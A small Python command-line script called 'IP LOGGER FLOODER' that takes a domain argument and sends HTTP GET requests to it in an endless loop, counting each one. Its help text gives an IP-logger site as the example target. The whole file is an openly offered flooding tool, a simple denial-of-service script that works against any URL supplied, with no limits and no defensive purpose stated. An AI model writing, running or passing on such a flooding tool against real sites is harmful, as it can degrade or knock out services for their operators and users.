import requests
import sys
import os
count = 0
def help():
  help = str('''
  IP LOGGER FLOODER - qolhf
  
  ARGUMENTS MARKED WITH * ARE REQUIRED!
  
  DOCS:
  
  --help: DISPLAYS THIS MESSAGE 
  --domain: DOMAIN TO SEND REQUESTS TO (*)
  
  Example: python3 iploggerflood.py --domain https://iplogger.org
  ''')
  print(help)
  sys.exit()

if len(sys.argv) == 1:
  help()
elif len(sys.argv) == 2:
  help()
elif len(sys.argv) == 3:
  site = sys.argv[2]
  if "help" in sys.argv:
    help()
    sys.exit()
  elif "--domain" in sys.argv:
    while True:
      r = requests.get(site)
      count = count + 1
      print("Sent request number {} to {}!".format(count, site))
  else:
    help()